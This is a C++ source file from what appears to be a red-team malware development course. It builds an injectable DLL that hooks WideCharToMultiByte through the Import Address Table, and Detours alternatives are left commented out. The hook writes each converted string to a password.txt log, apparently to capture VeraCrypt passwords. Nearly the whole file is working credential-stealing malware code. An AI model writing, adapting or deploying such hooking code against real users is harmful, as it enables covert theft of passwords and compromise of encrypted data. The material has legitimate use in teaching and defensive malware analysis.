/*

 Red Team Operator code template
 Hooking DLL using Detours

 author: reenz0h (twitter: @SEKTOR7net)

*/

#include <stdio.h>
#include <windows.h>
#include <dbghelp.h>

//#include "detours.h"
#include "win_types.h"

#pragma comment(lib, "user32.lib")
#pragma comment (lib, "dbghelp.lib")


// Hooking function
int HookedWideCharToMultiByte(UINT CodePage, DWORD dwFlags, _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar)
{

	int ret = 0;
	char buffer[50];
	LPDWORD numBytes = NULL;

	HANDLE hFile = NULL;
	hFile = CreateFileA("C:\\sektor7\\malware_dev_intermediate\\VeraCryptFolder\\password.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		OutputDebugStringA("Error with Log file!\n");
	else {
		ret = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte,
			lpDefaultChar, lpUsedDefaultChar);

		sprintf_s(buffer, "DATA = %s\n", lpMultiByteStr);
		WriteFile(hFile, buffer, strlen(buffer), numBytes, NULL);
		CloseHandle(hFile);
	}
	

	return ret;
}


//sets IAT hook for the WideCharToMultiByte Function.
BOOL IAT_Hookem(char* dll, char* origFunc, PROC hookingFunc) {

	ULONG size;
	DWORD i;
	BOOL found = FALSE;

	// get a HANDLE to a main module == BaseImage
	HANDLE baseAddress = GetModuleHandle(NULL);

	// get Import Table of main module
	PIMAGE_IMPORT_DESCRIPTOR importTbl = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToDataEx(
		baseAddress,
		TRUE,
		IMAGE_DIRECTORY_ENTRY_IMPORT,
		&size,
		NULL);

	// find imports for target dll 
	for (i = 0; i < size; i++) {
		char* importName = (char*)((PBYTE)baseAddress + importTbl[i].Name);
		if (_stricmp(importName, dll) == 0) {
			found = TRUE;
			break;
		}
	}
	if (!found)
		return FALSE;

	// Optimization: get original address of function to hook 
	// and use it as a reference when searching through IAT directly
	PROC origFuncAddr = (PROC)GetProcAddress(GetModuleHandleA(dll), origFunc);

	// Search IAT
	PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)baseAddress + importTbl[i].FirstThunk);
	while (thunk->u1.Function) {
		PROC* currentFuncAddr = (PROC*)&thunk->u1.Function;

		// found
		if (*currentFuncAddr == origFuncAddr) {

			// make sure memory is writable
			DWORD oldProtect = 0;
			VirtualProtect((LPVOID)currentFuncAddr, 4096, PAGE_READWRITE, &oldProtect);

			// set the hook
			*currentFuncAddr = (PROC)hookingFunc;

			// revert protection setting back
			VirtualProtect((LPVOID)currentFuncAddr, 4096, oldProtect, &oldProtect);

			//printf("IAT function %s() hooked!\n", origFunc);
			return TRUE;
		}
		thunk++;
	}

	return FALSE;
}

// Set hooks on HookedWideCharToMultiByte
/*BOOL Hookem(void) {

	LONG err;

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pWideCharToMultiByte, HookedWideCharToMultiByte);
	err = DetourTransactionCommit();

	//OutputDebugStringA("WideCharToMultiByte() hooked! ()\n");

	return TRUE;
}

// Revert all changes to original code
BOOL UnHookem(void) {

	LONG err;

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)pWideCharToMultiByte, HookedWideCharToMultiByte);
	err = DetourTransactionCommit();

	//OutputDebugStringA("Hook removed from WideCharToMultiByte() with result\n");

	return TRUE;
}
*/
/*
int main(void) {
	IAT_Hookem((char*)"Kernel32.dll", (char*)"WideCharToMultiByte", (PROC)HookedWideCharToMultiByte);
	return 0;
}
*/
extern "C" __declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		IAT_Hookem((char *)"Kernel32.dll", (char *)"WideCharToMultiByte", (PROC)HookedWideCharToMultiByte);
		//Hookem(); //for creating the hooks using detours. 
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		//UnHookem(); // for unhooking the function using detours.
		break;
	}

	return TRUE;
}


